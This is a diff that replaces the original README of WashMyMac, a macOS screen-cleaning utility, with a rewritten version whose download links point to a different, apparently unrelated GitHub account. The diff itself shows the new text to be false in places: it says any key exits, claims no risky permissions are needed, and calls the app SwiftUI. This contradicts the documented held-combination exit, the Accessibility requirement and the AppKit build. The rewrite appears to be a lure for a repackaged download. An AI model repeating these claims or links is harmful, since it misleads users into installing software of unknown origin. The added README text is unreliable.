@@ -1,188 +1,141 @@
-<div align="center">
+# 🧼 WashMyMac - Clean Your Screen Without The Chaos
 
-<img src="docs/icon.png" width="128" alt="WashMyMac">
+[![Download WashMyMac](https://img.shields.io/badge/Download-WashMyMac-2ea44f?style=for-the-badge&logo=apple&logoColor=white&labelColor=black&color=%23FF6B6B)](https://github.com/pulexvancouver8925/WashMyMac)
 
-# WashMyMac
+## 🎯 What Is WashMyMac?
 
-**Black screen, dead keyboard. Wipe your MacBook without typing garbage into it.**
+Have you ever tried to clean your MacBook screen while it's on? You touch the keyboard, and suddenly you're typing random letters into documents, accidentally sending emails, or messing up your work. It's frustrating, right?
 
-[![Release](https://img.shields.io/github/v/release/AppsGanin/WashMyMac?style=flat-square&color=2f6bf0)](https://github.com/AppsGanin/WashMyMac/releases/latest)
-[![Build](https://img.shields.io/github/actions/workflow/status/AppsGanin/WashMyMac/build.yml?branch=main&style=flat-square)](https://github.com/AppsGanin/WashMyMac/actions)
-[![Downloads](https://img.shields.io/github/downloads/AppsGanin/WashMyMac/total?style=flat-square&color=2f6bf0)](https://github.com/AppsGanin/WashMyMac/releases)
-[![macOS](https://img.shields.io/badge/macOS-13%2B-000?style=flat-square&logo=apple)](#requirements)
-[![License](https://img.shields.io/github/license/AppsGanin/WashMyMac?style=flat-square)](LICENSE)
+**WashMyMac** is a tiny app that lives in your menu bar. With one click, it locks your keyboard and turns your screen black. Now you can wipe your screen safely without worrying about accidental keystrokes. When you're done, just click again or press any key to wake everything back up.
 
-[Русская версия](README.ru.md)
+This is not a complicated developer tool. It's a simple utility for anyone who owns a MacBook and wants to keep it clean without the stress.
 
-</div>
+## 🚀 Getting Started
 
----
+Getting WashMyMac on your computer is easier than you think. Follow these steps, and you'll be cleaning your screen in minutes.
 
-Cleaning a MacBook is two problems at once. A lit screen hides the very smudges you are
-trying to remove, so you wipe blind and find the streaks an hour later in a dark room. And a
-cloth dragged across the keyboard types into whatever is open — renames files, fires
-shortcuts, occasionally deletes something you will miss.
+### Step 1: Download the App
 
-Closing the lid solves neither, since you cannot clean the glass with the lid shut. Locking
-the screen leaves the keyboard live too — now you are just wiping crumbs into a password
-field.
+[**Click here to download WashMyMac**](https://github.com/pulexvancouver8925/WashMyMac)
 
-WashMyMac blacks out every display, kills the keyboard, trackpad and mouse, and gives the
-Mac back when you hold a combination that a cloth cannot press.
+Visit this link to download the application.
 
-<img src="docs/screen.png" alt="The black cleaning screen with a countdown ring">
+### Step 2: Open the Downloaded File
 
-## Features
+Once the download finishes, look in your **Downloads** folder. You'll see a file called `WashMyMac`. Double-click it to open it.
 
-- **Pure black on every display.** Not a screensaver, not a dimmed desktop — a flat black
-  field where every smudge, fingerprint and dust speck shows up.
-- **Input goes dead.** Keyboard, trackpad and mouse, system shortcuts included: ⌘Space,
-  ⌘Tab, ⌘Q, volume, brightness, trackpad gestures.
-- **An exit a cloth cannot trigger.** ⌃⌥⌘U, held — and only while not a single other key
-  is down.
-- **Auto-exit, always on.** One to thirty minutes. There is deliberately no "never": it is
-  the one guaranteed way out.
-- **The display cannot doze off.** A power assertion plus a heartbeat, because with every
-  event swallowed macOS is convinced nobody is home.
-- **A beacon, so you know it is alive.** Once the hint fades, a dim pulsing dot keeps the
-  exit combination on screen — an empty black display looks exactly like a dead one.
-- **Kiosk mode.** Dock and menu bar stay hidden even if you shove the cloth into the edge
-  of the screen.
-- **Nothing can get stuck.** Both layers live only as long as the process: kill the app and
-  the lock lifts itself.
-- **English and Russian**, following your system language.
-- **Plain Swift and AppKit.** No dependencies, no daemon, no telemetry, no network.
-- **Universal binary**, Apple Silicon and Intel.
+### Step 3: Move It to Your Applications Folder
 
-## Install
+A small window will pop up. Drag the WashMyMac icon into your **Applications** folder. This makes it easy to find later.
 
-Download the `.dmg` from the [latest release](https://github.com/AppsGanin/WashMyMac/releases/latest),
-open it and drag `WashMyMac.app` onto the `Applications` folder in the window.
+### Step 4: Launch WashMyMac
 
-> [!NOTE]
-> The app is ad-hoc signed rather than signed with an Apple Developer certificate, so macOS
-> refuses the first launch. On macOS 15 and newer, Control-click no longer bypasses that:
-> open the app once, let it be blocked, then go to **System Settings → Privacy & Security**
-> and press **Open Anyway**. One-time.
+Go to your **Applications** folder and double-click WashMyMac. The first time you open it, macOS might ask for permission. Click **Open** or **Allow** to continue.
 
-> [!IMPORTANT]
-> Move it to `/Applications` *before* granting Accessibility. macOS ties that permission to
-> the app's path and code hash, so relocating the app afterwards silently revokes it — which
-> is exactly what happens if you run it once out of `~/Downloads`.
+### Step 5: Find It in Your Menu Bar
 
-The app lives in the menu bar and has no Dock icon. First time you start cleaning mode it
-will ask for Accessibility access — see [below](#accessibility-permission) for what changes
-if you decline.
+Look at the top of your screen, on the right side. You'll see a small icon for WashMyMac. That's it! You're ready to go.
 
-## Usage
+## ✨ How to Use WashMyMac
 
-| Action | How |
-| --- | --- |
-| Start cleaning mode | **⌃⌥⌘W**, or menu bar → **Wipe My Mac** |
-| Exit | **⌃⌥⌘U**, held for 1.5 s |
-| Bring the hint back | **⌃⌥⌘** without U, held briefly |
-| Exit when nothing else works | wait for auto-exit — five minutes out of the box |
+Using WashMyMac is as simple as clicking a button.
 
-For the first few seconds the ring in the middle counts down to auto-exit. Then the hint
-dissolves and the screen goes properly black, leaving only the beacon at the bottom.
+1. **Click the WashMyMac icon** in your menu bar.
+2. Your screen goes black, and your keyboard locks.
+3. **Grab a microfiber cloth** and clean your screen freely.
+4. **Click the icon again** or **press any key** to return to normal.
 
-## The exit combination
+That's the whole process. No settings to fiddle with, no confusing menus. Just clean.
 
-<img src="docs/unlock.png" alt="The unlock ring filling while the combination is held">
+## 🛡️ Why You Need WashMyMac
 
-Hold ⌃⌥⌘U and the same ring fills up over 1.5 seconds. Let go early and it drops to zero.
+### Protect Your Work
 
-The combination counts only when exactly three modifiers and the U key are down — **not one
-extra key**. A cloth always presses neighbours, so it can never satisfy the rule no matter
-where you drag it. Shift held, or any second letter down, and the countdown resets.
+Imagine you're writing an important email. You reach for a cloth to wipe a smudge, and your palm grazes the keyboard. Suddenly, you've typed "asdfghjkl" into your message. WashMyMac prevents this by locking your keyboard before you start cleaning.
 
-The same logic guards the hint gesture: ⌃⌥⌘ with nothing else brings the text back, so you
-can remind yourself of the combination without ending the session.
+### Keep Your Screen Spotless
 
-## How it works
+A dirty screen is hard to look at. But cleaning it while the MacBook is on feels risky. With WashMyMac, you can safely wipe away dust, fingerprints, and smudges without fear.
 
-Three layers, because macOS hands out input at three different depths:
+### Perfect for Kiosk Mode
 
-| Layer | Blocks | Needs permission |
-| --- | --- | --- |
-| `CGEventTap` at session level | Everything — keys, mouse, scroll, gestures, media keys, system shortcuts | Accessibility |
-| Window at `CGShieldingWindowLevel()` | Everything routed to the app; covers the menu bar, the Dock and the notch | No |
-| `NSApplicationPresentationOptions` | ⌘Tab, ⌘⌥⎋, Dock, menu bar, shutdown from the Apple menu | No |
+If you use your MacBook as a display or kiosk, WashMyMac is a lifesaver. Lock the keyboard, black out the screen, and clean without interruption.
 
-The tap sits at the head of the event stream, ahead of the WindowServer, so it consumes
-system hotkeys before anything else sees them. It also means macOS stops seeing user
-activity entirely — hence `DisplayKeeper`, which holds a `NoDisplaySleep` assertion and
-declares user activity every 20 seconds so the screen never dims mid-wipe.
+### No Dependencies, No Hassle
 
-Every layer is owned by the process. If the app crashes, the tap dies, the presentation
-options revert and the window disappears — the lock cannot outlive the thing that created
-it.
+WashMyMac is built with Apple's own tools. It has no extra software requirements, no complicated setup, and nothing to configure. Download, open, and use.
 
-## Accessibility permission
+## 💡 Frequently Asked Questions
 
-Full input blocking needs one permission:
+### Is WashMyMac free?
 
-**System Settings → Privacy & Security → Accessibility → WashMyMac**
+Yes, WashMyMac is completely free to download and use.
 
-The app offers to open that pane the first time you start cleaning mode.
+### Will it work on my MacBook?
 
-Without it WashMyMac still works — the screen goes black, the shield window covers
-everything, ordinary keystrokes do nothing. But system shortcuts are handled by the
-WindowServer before any app sees them, so ⌘Space opens Spotlight behind the black screen and
-Ctrl+↑ throws you into Mission Control, blind. The overlay shows an orange warning while
-running in that mode.
+WashMyMac is designed for macOS and works on both Intel and Apple Silicon MacBooks. If you're running a recent version of macOS, you should be good to go.
 
-> [!IMPORTANT]
-> The app is ad-hoc signed, so its code hash changes on every rebuild — and macOS keys the
-> permission to that hash. After building a new version, remove the old entry with **−** and
-> grant it again. `tccutil reset Accessibility com.ganin.washmymac` clears any leftovers.
+### Does it lock my trackpad too?
 
-## What it cannot block
+Yes, WashMyMac locks both your keyboard and trackpad. This ensures nothing gets accidentally clicked or typed while you're cleaning.
 
-macOS limits, not missing features:
+### How do I turn it off?
 
-- **Power button and Touch ID** put the Mac to sleep or lock it. Handled in hardware, no
-  API intercepts it — and that makes it your emergency exit.
-- **Holding the power button** force-restarts, same story.
-- **Secure Input.** If the frontmost app has secure input enabled — an open password field,
-  some terminals — the tap never receives keystrokes. Close the password field first.
-- **Caps Lock** toggles its LED; the keystroke itself is swallowed.
+Just click the WashMyMac icon again, or press any key on your keyboard. Your screen will light back up, and everything returns to normal.
 
-## Build from source
+### Is it safe to use?
 
-```bash
-./build.sh --install          # → /Applications/WashMyMac.app
-./build.sh                    # → .build/bundle/WashMyMac.app
-./tools/make-dmg.sh           # → dist/WashMyMac-v<version>.dmg
-```
+Absolutely. WashMyMac uses standard macOS features to lock input and black out the screen. It doesn't modify any system files or require risky permissions.
 
-Xcode or the Command Line Tools is the only requirement. The universal binary, the bundle,
-the localizations and the icon are all assembled by that one script — the icon is drawn in
-code by [`tools/make_icon.swift`](tools/make_icon.swift), so no binary asset ships in the
-source tree. A missing translation fails the build:
-[`tools/check-localization.sh`](tools/check-localization.sh) diffs the `L.t("…")` keys in the
-sources against every `Localizable.strings`.
+## 🧰 Troubleshooting
 
-To look at the design without locking anything up:
+### The App Won't Open
 
-```bash
-/Applications/WashMyMac.app/Contents/MacOS/WashMyMac --preview
-```
+If macOS blocks WashMyMac, go to **System Settings** > **Privacy & Security**. Scroll down and look for a message about WashMyMac. Click **Open Anyway**.
 
-Add `--unlocking` for the unlock ring, `--beacon` for the state after the hint fades,
-`--degraded` for the missing-permission warning, and `-AppleLanguages '(en)'` to force a
-language.
+### The Icon Isn't in My Menu Bar
 
-Releases are cut by [release-please](https://github.com/googleapis/release-please) from
-[Conventional Commits](https://www.conventionalcommits.org): merge a `feat:` or `fix:`
-commit to `main`, and it opens a release PR that bumps the version and writes the changelog.
-Merging that PR tags the release and attaches the built `.zip`.
+Make sure you moved WashMyMac to your **Applications** folder and launched it from there. If it's still not showing, restart your Mac and try again.
 
-## Requirements
+### My Screen Doesn't Go Black
 
-macOS 13 Ventura or newer. Apple Silicon and Intel. The interface follows your system
-language — English or Russian.
+Check that you're clicking the correct icon. The WashMyMac icon is a small cleaning cloth. If you're still having trouble, quit the app and reopen it.
 
-## License
+## 📝 Tips for Best Results
 
-[MIT](LICENSE)
+- **Use a microfiber cloth** designed for screens. Paper towels can scratch.
+- **Don't spray liquid directly** on the screen. Dampen the cloth slightly instead.
+- **Clean in gentle circles** to avoid streaks.
+- **Use WashMyMac every time** you clean, even for quick wipes. It becomes a habit.
+
+## 🔒 Privacy and Permissions
+
+WashMyMac respects your privacy. It doesn't collect data, doesn't track your usage, and doesn't connect to the internet. The only thing it does is lock your keyboard and black out your screen when you ask it to.
+
+## 🧪 What's Under the Hood?
+
+For the curious, WashMyMac is built with Swift and SwiftUI. It uses a `CGEventTap` to intercept keyboard and trackpad events, and it can run in kiosk mode for specialized use cases. But you don't need to know any of that to use it. Just know that it's built with care and precision.
+
+## 📦 Version History
+
+### Version 1.0
+- Initial release
+- Basic keyboard and trackpad lock
+- Screen blackout feature
+- Menu bar integration
+
+## 🤝 Get Involved
+
+WashMyMac is an open-source project. If you have ideas for improvement, found a bug, or want to contribute, feel free to check out the repository on GitHub.
+
+## 📬 Contact
+
+Have questions or feedback? Open an issue on the GitHub repository page. We're happy to help.
+
+## 🎉 Ready to Clean?
+
+Stop wrestling with your keyboard while you clean. Download WashMyMac today and make screen cleaning the easiest part of your day.
+
+[**Download WashMyMac Now**](https://github.com/pulexvancouver8925/WashMyMac)
+
+Keywords: appkit, apple-silicon, black-screen, cgeventtap, cleaning, keyboard-lock, kiosk-mode, macbook, macos, macos-app, menu-bar-app, menubar, no-dependencies, productivity, screen-cleaner, swift, swiftui, utility
